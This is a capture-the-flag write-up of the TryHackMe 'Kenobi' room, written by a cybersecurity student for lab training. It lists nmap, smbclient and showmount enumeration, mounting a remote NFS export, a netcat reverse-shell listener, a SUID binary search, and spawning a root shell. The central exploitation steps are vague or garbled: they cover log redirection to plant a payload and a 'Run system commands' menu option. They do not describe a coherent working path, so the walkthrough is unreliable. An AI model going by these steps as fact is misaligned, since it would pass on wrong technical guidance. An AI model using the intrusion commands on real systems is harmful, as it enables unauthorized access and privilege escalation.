# Kenobi – TryHackMe Writeup

## Overview

| Attribute   | Value                                 |
| ----------- | ------------------------------------- |
| Platform    | TryHackMe                             |
| Room        | Kenobi                                |
| Difficulty  | Easy                                  |
| Target OS   | Linux                                 |
| Attack Type | Service Misconfiguration Exploitation |
| Author      | Shlok Jitendra Yadav                  |

---

# Objective

The goal of this room is to:

1. Perform network reconnaissance.
2. Enumerate exposed services.
3. Identify misconfigured services.
4. Exploit SMB and NFS misconfigurations.
5. Gain initial access to the system.
6. Escalate privileges to root.

---

# Attack Flow

```
Reconnaissance
      ↓
Service Enumeration
      ↓
SMB Enumeration
      ↓
NFS Misconfiguration Discovery
      ↓
Initial Access
      ↓
Privilege Escalation
      ↓
Root Access
```

---

# 1. Reconnaissance & Enumeration

## Target Identification

The target machine IP is obtained from the TryHackMe dashboard.

Example:

```
10.10.x.x
```

---

## Nmap Scan

A service scan was performed to identify open ports and running services.

```bash
nmap -sC -sV <TARGET_IP>
```

### Discovered Open Ports

| Port | Service |
| ---- | ------- |
| 21   | FTP     |
| 22   | SSH     |
| 111  | RPCBind |
| 139  | SMB     |
| 445  | SMB     |
| 2049 | NFS     |

The presence of **SMB and NFS services** suggests possible file sharing misconfigurations.

---

# 2. SMB Enumeration

List available SMB shares:

```bash
smbclient -L //<TARGET_IP>/
```

This reveals available shared directories.

Connect to the share:

```bash
smbclient //<TARGET_IP>/anonymous
```

Inside the share, a log file was discovered.

Example:

```
log.txt
```

The log file contains useful information about the system.

---

# 3. NFS Enumeration

Check exported NFS shares:

```bash
showmount -e <TARGET_IP>
```

Example result:

```
/var *
```

Mount the NFS share locally.

```bash
mkdir /mnt/kenobi
mount <TARGET_IP>:/var /mnt/kenobi
```

Now the remote directory is accessible locally.

---

# 4. Exploiting the NFS Misconfiguration

Within the mounted directory, the following path exists:

```
/mnt/kenobi/tmp
```

This directory is writable.

Using the previously discovered **FTP log information**, it is possible to manipulate file paths.

The FTP server writes logs to the `/var/tmp` directory, which we have access to through NFS.

By redirecting logs into a location we control, we can place a **payload** on the target system.

---

# 5. Gaining Initial Access

A reverse shell payload can be placed into the writable directory.

Example listener setup:

```bash
nc -lvnp 4444
```

Once executed, a shell is obtained on the system.

---

# 6. Privilege Escalation

After obtaining a shell, privilege escalation techniques are required.

Search for **SUID binaries**:

```bash
find / -perm -4000 2>/dev/null
```

A suspicious SUID binary is found:

```
/usr/bin/menu
```

---

# 7. Exploiting the SUID Binary

Executing the binary reveals multiple options.

Example:

```
1. View files
2. Run system commands
3. Exit
```

Selecting the option that executes system commands allows command injection.

Run:

```
/bin/sh
```

This spawns a root shell.

---

# 8. Root Access

Verify privileges:

```bash
whoami
```

Output:

```
root
```

The system is now fully compromised.

---

# Flags

## User Flag

Located in the user's home directory.

```
/home/kenobi/user.txt
```

---

## Root Flag

Located in the root directory.

```
/root/root.txt
```

---

# Tools Used

| Tool           | Purpose                |
| -------------- | ---------------------- |
| Nmap           | Network scanning       |
| SMBClient      | SMB share enumeration  |
| Showmount      | NFS share discovery    |
| Netcat         | Reverse shell listener |
| Linux commands | Privilege escalation   |

---

# MITRE ATT&CK Mapping

| Technique | Description                       |
| --------- | --------------------------------- |
| T1046     | Network Service Discovery         |
| T1135     | Network Share Discovery           |
| T1203     | Exploitation for Client Execution |
| T1059     | Command Execution                 |
| T1068     | Privilege Escalation              |

---

# Key Security Lessons

* Misconfigured file sharing services can expose sensitive data.
* SMB shares should not allow anonymous access.
* NFS shares must be properly restricted.
* SUID binaries can create privilege escalation opportunities.
* Proper system hardening reduces attack surface.

---

# Author

Shlok Jitendra Yadav
Cybersecurity Student

GitHub:
https://github.com/Shlokultra

---

# Disclaimer

This writeup is created for educational purposes only.
All activities were performed inside a legal lab environment provided by TryHackMe.
